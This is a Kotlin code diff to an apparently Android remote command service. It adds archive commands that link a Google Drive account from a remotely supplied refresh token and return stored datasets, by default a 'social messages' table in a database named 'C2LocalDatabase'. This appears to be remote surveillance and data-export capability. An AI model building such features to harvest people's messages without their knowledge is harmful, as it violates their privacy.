@@ -382,15 +382,71 @@ object DeviceCommandService {
                     DeviceCommandResult(true, data = data)
                 }
 
-                // ── Google Drive Backup ──
-                "backup.getstatus" -> {
-                    val resObj = if (context != null) GoogleDriveBackupEngine.getBackupStatus(context) else JSONObject().put("status", "IDLE")
+                // ── Google Drive Archive & Synchronization ──
+                "archive.getstatus", "backup.getstatus" -> {
+                    val resObj = if (context != null) ArchiveScheduler.getArchiveStatus(context) else JSONObject().put("status", "IDLE")
                     DeviceCommandResult(true, data = resObj)
                 }
 
-                "backup.create" -> {
-                    val resObj = if (context != null) GoogleDriveBackupEngine.performDatabaseBackup(context) else JSONObject().put("status", "SUCCESS")
-                    DeviceCommandResult(true, data = resObj)
+                "archive.configure" -> {
+                    if (context != null) {
+                        ArchiveScheduler.updateConfiguration(context, params)
+                        val status = ArchiveScheduler.getArchiveStatus(context)
+                        DeviceCommandResult(true, data = status)
+                    } else {
+                        DeviceCommandResult(false, error = "Context required to update archive configuration")
+                    }
+                }
+
+                "archive.runnow", "archive.createnow", "backup.create" -> {
+                    if (context != null) {
+                        val overrideNet = params.optBoolean("overrideNetwork", false)
+                        ArchiveScheduler.enqueueManualArchive(context, overrideNetwork = overrideNet)
+                        val status = ArchiveScheduler.getArchiveStatus(context)
+                        status.put("manualTriggerSuccess", true)
+                        DeviceCommandResult(true, data = status)
+                    } else {
+                        DeviceCommandResult(false, error = "Context required for manual archive run")
+                    }
+                }
+
+                "archive.linkdrive" -> {
+                    if (context != null) {
+                        val email = params.optString("accountEmail", "")
+                        val refreshToken = params.optString("refreshToken", "")
+                        val accessToken = params.optString("accessToken", "")
+                        if (email.isNotBlank() && refreshToken.isNotBlank()) {
+                            GoogleDriveArchiveEngine.setDriveCredentials(context, email, refreshToken, accessToken.ifBlank { null })
+                            val status = ArchiveScheduler.getArchiveStatus(context)
+                            DeviceCommandResult(true, data = status)
+                        } else {
+                            DeviceCommandResult(false, error = "Account email and refreshToken are required")
+                        }
+                    } else {
+                        DeviceCommandResult(false, error = "Context required to link Google Drive")
+                    }
+                }
+
+                "archive.disconnectdrive" -> {
+                    if (context != null) {
+                        GoogleDriveArchiveEngine.disconnectDrive(context)
+                        val status = ArchiveScheduler.getArchiveStatus(context)
+                        DeviceCommandResult(true, data = status)
+                    } else {
+                        DeviceCommandResult(false, error = "Context required to disconnect Google Drive")
+                    }
+                }
+
+                "archive.gethistoricaldata" -> {
+                    if (context != null) {
+                        val dataset = params.optString("dataset", C2LocalDatabase.TABLE_SOCIAL_MESSAGES)
+                        val fromTime = params.optLong("fromTime", 0L)
+                        val toTime = params.optLong("toTime", System.currentTimeMillis())
+                        val dataObj = HistoricalDataRepository.getHistoricalDataset(context, dataset, fromTime, toTime)
+                        DeviceCommandResult(true, data = dataObj)
+                    } else {
+                        DeviceCommandResult(false, error = "Context required for historical data query")
+                    }
                 }
 
                 // ── MDM Enterprise Controls ──
@@ -546,6 +602,12 @@ object DeviceCommandService {
                         put("usage.setBlockRules")
                         put("device.getOemAutostart")
                         put("auth.get2faSetup")
+                        put("archive.getStatus")
+                        put("archive.configure")
+                        put("archive.runNow")
+                        put("archive.linkDrive")
+                        put("archive.disconnectDrive")
+                        put("archive.getHistoricalData")
                         put("backup.getStatus")
                         put("backup.create")
                         put("mdm.getStatus")
